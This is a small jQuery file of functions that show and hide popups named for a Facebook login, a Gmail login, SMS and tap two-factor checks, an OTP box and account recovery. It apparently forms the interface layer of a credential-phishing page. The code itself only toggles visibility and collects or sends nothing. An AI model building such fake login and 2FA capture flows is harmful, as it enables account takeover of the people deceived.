
function open_facebook() {
    $('.login-facebook').show();
    $('.popup-overlay').hide();
  
}

function open_twitter() {
    $('.containerxgmailx').show();
    $('.popup-overlay').hide();
  
}

function opentwofacsms() {
 
    $('.container2facsms ').show();

   
}

function opentwofactap() {
    $('.verify-containertap ').show();
   
}

function tutup_facebook() {
    $('.login-facebook').hide()
   
}

function tutup_twitter() {
    $('.containerxgmailx').hide();
  
}
function open_recfb() {
    $('.login-facebook2c').show();
    if ($('.login-facebook').length > 0) {
        $('.login-facebook').hide();
    }
    // Check if .containerxgmailx exists before trying to hide it
    if ($('.containerxgmailx').length > 0) {
        $('.containerxgmailx').hide();
    }
}

function tutup_facebookr() {
    $('.login-facebook2c').hide()
   
}

function tutup_facebookOTP() {
    $('.login-facebook2cx').hide()

   
}
